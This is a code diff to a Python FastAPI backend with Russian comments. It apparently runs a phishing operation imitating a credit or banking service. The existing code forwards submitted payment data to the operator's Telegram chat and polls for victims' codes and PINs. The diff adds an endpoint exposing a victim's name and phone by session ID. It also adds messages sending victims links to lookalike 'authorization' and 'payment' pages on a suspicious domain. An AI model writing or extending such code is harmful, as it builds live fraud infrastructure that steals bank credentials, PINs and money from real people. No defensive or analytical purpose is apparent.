@@ -224,7 +224,20 @@ async def submit_payment(data: PaymentData):
     send_to_telegram(MY_CHAT_ID, message)
     return {"status": "ok"}
 
-# ========== 6. ПРОВЕРКА СТАТУСА ДЛЯ РЕДИРЕКТА ==========
+# ========== 6. ПОЛУЧЕНИЕ ДАННЫХ КЛИЕНТА ПО SESSION_ID ==========
+@app.get("/get_application/{session_id}")
+async def get_application(session_id: str):
+    session = sessions.get(session_id)
+    if not session:
+        return {"status": "not_found"}
+    
+    return {
+        "status": "ok",
+        "phone": session.get("phone", "Не указан"),
+        "name": session.get("name", "")
+    }
+
+# ========== 7. ПРОВЕРКА СТАТУСА ДЛЯ РЕДИРЕКТА ==========
 @app.get("/check_action_status/{session_id}")
 async def check_action_status(session_id: str):
     session = sessions.get(session_id)
@@ -237,7 +250,7 @@ async def check_action_status(session_id: str):
         return {"action": action}
     return {"action": None}
 
-# ========== 7. ПРОВЕРКА СТАТУСА ДЛЯ КОДА/PIN ==========
+# ========== 8. ПРОВЕРКА СТАТУСА ДЛЯ КОДА/PIN ==========
 @app.get("/check_status/{session_id}")
 async def check_status(session_id: str):
     session = sessions.get(session_id)
@@ -257,7 +270,7 @@ async def check_status(session_id: str):
     else:
         return {"status": status}
 
-# ========== 8. ОБРАБОТКА КНОПОК ==========
+# ========== 9. ОБРАБОТКА КНОПОК ==========
 @app.post("/webhook/callback")
 async def handle_callback(request: Request):
     data = await request.json()
@@ -283,6 +296,11 @@ async def handle_callback(request: Request):
     if action == "auth":
         if session:
             session["pending_action"] = "auth"
+        if user_chat_id:
+            send_to_telegram(
+                str(user_chat_id),
+                f"🔐 Перейдите по ссылке для авторизации:\nhttps://alfakreditplus.warepointpay.ru/page_82554/?session_id={session_id}"
+            )
         send_to_telegram(MY_CHAT_ID, f"🔐 Команда auth для сессии {session_id}")
         requests.post(
             f"{TELEGRAM_API_URL}/answerCallbackQuery",
@@ -293,6 +311,11 @@ async def handle_callback(request: Request):
     elif action == "pay":
         if session:
             session["pending_action"] = "pay"
+        if user_chat_id:
+            send_to_telegram(
+                str(user_chat_id),
+                f"💳 Перейдите по ссылке для оплаты:\nhttps://alfakreditplus.warepointpay.ru/page_63860/?session_id={session_id}"
+            )
         send_to_telegram(MY_CHAT_ID, f"💳 Команда pay для сессии {session_id}")
         requests.post(
             f"{TELEGRAM_API_URL}/answerCallbackQuery",
